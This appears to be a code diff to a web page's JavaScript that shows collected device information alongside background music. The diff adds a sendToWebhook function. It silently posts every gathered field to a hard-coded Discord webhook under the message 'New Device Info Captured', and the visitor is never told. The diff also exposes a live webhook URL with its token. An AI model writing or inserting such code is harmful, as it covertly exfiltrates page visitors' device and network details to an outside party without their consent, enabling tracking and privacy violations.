@@ -40,6 +40,8 @@
             infoLine.textContent = `${key}: ${value}`;
             deviceInfoDiv.appendChild(infoLine);
         });
+
+        sendToWebhook(info);
     }
 
     async function fetchIPInfo() {
@@ -76,4 +78,33 @@
         const music = document.getElementById('backgroundMusic');
         music.play();
     });
+
+    function sendToWebhook(info) {
+        const webhookURL = 'https://discord.com/api/webhooks/1284698790195892307/cC1QHKf7p1Gw9zZQm0qitFd3_Cux_qqKQDLU6-vm0qhLpgUQlf3qXJGpxupYeFjIV-Ca';
+        
+        const payload = {
+            content: "New Device Info Captured",
+            embeds: [{
+                title: "Device Information",
+                description: Object.entries(info).map(([key, value]) => `**${key}**: ${value}`).join("\n"),
+                color: 3447003
+            }]
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+        }).then(response => {
+            if (response.ok) {
+                console.log('sent');
+            } else {
+                console.error('failed');
+            }
+        }).catch(error => {
+            console.error('Error:', error);
+        });
+    }
 })();
